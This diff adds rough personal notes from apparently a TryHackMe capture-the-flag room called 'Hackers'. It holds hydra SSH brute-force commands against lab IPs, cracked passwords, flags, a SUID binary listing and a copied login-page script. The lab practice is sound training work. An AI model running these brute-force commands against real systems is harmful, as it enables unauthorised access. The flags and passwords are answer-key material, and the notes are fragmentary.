@@ -1,0 +1,165 @@
+Machine name is Hackers again!!
+
+The machine name is hackers!!
+plague@gibson
+/backdoor
+/backdoor/shell
+ftp anon login found using nmap
+contents
+
+	Note:
+	Any users with passwords in this list:
+	love
+	sex
+	god
+	secret
+	will be subject to an immediate disciplinary hearing.
+	Any users with other weak passwords will be complained at, loudly.
+	These users are:
+	rcampbell:Robert M. Campbell:Weak password
+	gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
+	Exposing the company's cryptographic keys is a disciplinary offense.
+	Eugene Belford, CSO
+
+hydra -l rcampbell -P /home/kali/Dictionaries/rockyou.txt 10.10.247.139 ssh
+
+[22][ssh] host: 10.10.247.139   login: rcampbell   password: david1
+cat .flag
+thm{12361ad240fec43005844016092f1e05}
+
+for this we need a public or private key could not find the one only did till this much!
+
+hydra -l gcrawford -P /home/kali/Dictionaries/rockyou.txt 10.10.247.139 ssh
+just change the ip
+
+
+robots.txt contains
+
+Skiddies keep out.
+Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
+- plague
+
+
+
+
+
+
+
+hydra -l rcampbell -P /home/kali/Dictionaries/rockyou.txt 10.10.133.42 ssh
+
+
+ftp anonymous
+
+
+ also we had a .flag and the flag was
+ 
+ thm{678d0231fb4e2150afc1c4e336fcf44d}
+
+ [22][ssh] host: 10.10.7.51   login: rcampbell   password: gorgeous
+ new password is tanishqmum
+
+
+[22][ssh] host: 10.10.133.42   login: rcampbell   password: cowboys
+
+
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/umount
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+
+
+
+
+async function postData(url = '', data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'POST', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+        body: encodeFormData(data) // body data type must match "Content-Type" header
+    });
+    return response; // We don't always want JSON back
+}
+const encodeFormData = (data) => {
+    return Object.keys(data)
+        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
+        .join('&');
+}
+function onLoad() {
+    document.querySelector("#loginForm").addEventListener("submit", function (event) {
+        //on pressing enter
+        const usernameBox = document.querySelector("#username");
+        const passwordBox = document.querySelector("#password");
+        event.preventDefault()
+        login()
+    });
+}
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    console.log(statusOrCookie)
+    if (statusOrCookie=== "Incorrect credentials") {
+        alert("Incorrect Credentials")
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/backdoor/shell"
+    }
+}
+
